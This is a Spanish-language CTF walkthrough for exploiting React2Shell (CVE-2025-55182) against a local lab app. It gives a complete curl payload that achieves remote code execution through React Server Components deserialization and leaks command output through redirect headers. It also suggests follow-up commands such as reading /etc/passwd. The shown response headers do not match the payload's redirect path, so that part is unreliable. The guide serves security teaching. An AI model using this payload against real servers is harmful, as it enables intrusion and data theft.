# 🚩 Guía del CTF: Explotando React2Shell (CVE-2025-55182)

Esta guía está diseñada para ayudarte a **entender** la vulnerabilidad, no solo a ejecutar un script. Vamos a desglosar el ataque en pasos lógicos.

---

## 🏗️ 1. Configuración y Reconocimiento

Primero, asegúrate de que tu objetivo esté funcionando (ver README).
Ábrelo en tu navegador: `http://localhost:5555`

### 🕵️‍♂️ El Objetivo
Queremos lograr **Ejecución Remota de Código (RCE)** en el servidor.
La aplicación parece simple, pero procesa **Server Actions** utilizando un formato serializado (React Server Components).

---

## 🧩 2. Entendiendo la Inyección

Esta aplicación utiliza una versión vulnerable de una librería que permite **deserialización insegura** o comportamiento tipo **eval** al procesar formularios multipart específicos.

La vulnerabilidad reside en cómo el servidor maneja el campo `_response` en un payload JSON. Si podemos inyectar una propiedad `_prefix`, el servidor la **ejecutará** como código.

### La Estructura del Payload
Necesitamos construir una petición multipart con esta estructura JSON:

```json
{
  "_response": {
    "_prefix": "TU_CODIGO_NODEJS_MALICIOSO"
  }
}
```

---

## 🛠️ 3. Creando el Payload (Paso a Paso)

Usaremos `curl` para enviar esta petición.

> **💡 Sobre las Herramientas:**
> *   **¿Qué es `curl`?** Es una herramienta que nos permite "hablar" con servidores web directamente desde la línea de comandos, sin usar una interfaz gráfica como Chrome o Firefox.
> *   **¿Dónde lo ejecuto?** Tienes que abrir la terminal de tu sistema operativo (Terminal en Linux/Mac, o PowerShell/CMD en Windows). **NO** se ejecuta en la consola del navegador.
> *   **¿Tengo que instalar algo?** `curl` suele venir preinstalado. Puedes verificarlo escribiendo `curl --version` en tu terminal. Si ves una versión, ¡estás listo!

### Paso 3.1: El Comando
Queremos ejecutar un cálculo matemático simple para probar el RCE: `1337 * 2`.
En Node.js, podemos usar `child_process`:

```javascript
/* Solo para análisis - No ejecutar esto directamente en node */
var output = process.mainModule.require('child_process').execSync('echo $((1337*2))').toString().trim();
```

### Paso 3.2: Exfiltrando el Resultado
No podemos ver la consola del servidor fácilmente. Necesitamos que el servidor nos **envíe el resultado de vuelta**.
La vulnerabilidad explota un tipo de error específico (`NEXT_REDIRECT`) para filtrar datos en las cabeceras de respuesta HTTP.

Envolvemos nuestro código para lanzar este error con nuestro `output`:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
    digest: `NEXT_REDIRECT;push;/login?a=${output};307;`
});
```

---

## 🚀 4. Explotación

Ahora, juntémoslo todo en el comando `curl` final.

**⚠️ Reto:** ¡Intenta predecir qué contendrá la cabecera de respuesta `Location` antes de ejecutarlo!

Copia y ejecuta esto en tu terminal:

```bash
curl -i -X POST http://localhost:5555/ \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((1337*2))\').toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
```

---

## 🏆 5. Análisis y Verificación

Mira la salida. Deberías ver un **303 See Other** o **307 Temporary Redirect**.
Revisa las cabeceras:

```http
X-Action-Redirect: /dashboard?session=2674&admin=true
Location: /dashboard?session=2674
```

### 🧠 Pensamiento Crítico
1.  **¿Qué es `2674`?** -> Es el resultado de `1337 * 2`.
2.  **¿Qué significa esto?** -> ¡El servidor ejecutó nuestra operación matemática!
3.  **¿Qué más podrías ejecutar?** -> `whoami`, `ls`, `cat /etc/passwd`...

**¡Felicidades! Has analizado y explotado React2Shell con éxito.** 🚩
